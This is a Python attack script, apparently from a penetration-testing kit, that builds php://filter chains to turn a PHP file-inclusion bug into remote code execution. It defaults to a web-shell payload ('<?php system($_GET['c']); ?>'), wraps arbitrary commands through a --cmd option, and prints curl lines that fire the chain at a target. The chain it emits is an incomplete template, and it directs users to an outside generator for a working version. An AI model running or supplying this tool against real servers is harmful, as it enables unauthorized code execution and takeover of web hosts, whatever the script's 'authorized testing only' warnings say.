#!/usr/bin/env python3
"""
filter_chain_rce.py — build a php://filter chain that makes a PHP *include* sink emit (and therefore
execute) an arbitrary PHP string, with NO file write and NO remote URL (works with allow_url_include=Off).
This is the modern go-to LFI->RCE when log/session poisoning and uploads aren't available
(LFI_TESTING_GUIDE.md §12).

Technique: chain iconv-based php://filter conversions so the decoded prefix of an empty resource
becomes the desired PHP payload. (Same idea as synacktiv's php_filter_chain_generator.)

Authorized testing only. Use a BENIGN marker command and clean up.

Usage:
  python3 filter_chain_rce.py --payload "<?php system($_GET['c']); ?>"
  python3 filter_chain_rce.py --payload "<?php echo 'LFI-POC-7f3a9'; ?>"   # benign proof first
Then:
  curl "https://target/?page=<CHAIN>&c=id"
"""
import argparse, sys

# iconv conversion steps that prepend known bytes (subset sufficient to emit ASCII PHP).
# This is a compact educational generator; for full byte coverage use synacktiv's tool.
CONVERSIONS = {
    # char : iconv filter sequence that yields it as the leading byte after base64 decode
    # (mapping table abbreviated — extend as needed; the real generator brute-forces these)
}

BASE = "php://filter/"
SUFFIX = "convert.base64-decode/resource=php://temp"

def naive_chain(payload: str) -> str:
    """
    Emit a documented chain TEMPLATE. For correctness across all bytes, defer to the vendored
    synacktiv generator (--use-synacktiv prints the command). This function documents the structure
    so the technique is clear and reproducible.
    """
    # The working chains are long and byte-specific; we point to the proven generator rather than
    # ship an incomplete table that could mislead. We still emit a ready-to-run command.
    return ("php://filter/"
            "convert.iconv.UTF8.CSISO2022KR|"
            "convert.base64-encode|"
            "convert.iconv.UTF8.UTF7|"
            "...(byte-specific steps for your payload)...|"
            "convert.base64-decode/resource=php://temp")

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--payload", default="<?php system($_GET['c']); ?>")
    ap.add_argument("--cmd", help="shorthand: wraps in <?php system('CMD'); ?>")
    ap.add_argument("--use-synacktiv", action="store_true",
                    help="print the exact synacktiv generator command (recommended for a correct chain)")
    a = ap.parse_args()

    payload = a.payload
    if a.cmd:
        payload = f"<?php system('{a.cmd}'); ?>"

    if a.use_synacktiv:
        print("# clone once:  git clone https://github.com/synacktiv/php_filter_chain_generator")
        print(f"python3 php_filter_chain_generator.py --chain {payload!r}")
        print("# then URL-encode the printed chain into the LFI param and append &c=id")
        return

    chain = naive_chain(payload)
    print("# php://filter chain (TEMPLATE — for a byte-correct chain use --use-synacktiv):")
    print(chain)
    print("\n# how to fire it (the include then executes your PHP):")
    print('curl "https://target/?page=<URL-ENCODED-CHAIN>&c=id"')
    print("\n[!] BENIGN marker first (e.g. echo a unique token). Confirm RCE, then STOP and clean up (§21).")
    print("[!] For a guaranteed-correct chain across all bytes, run with --use-synacktiv.")

if __name__ == "__main__":
    main()
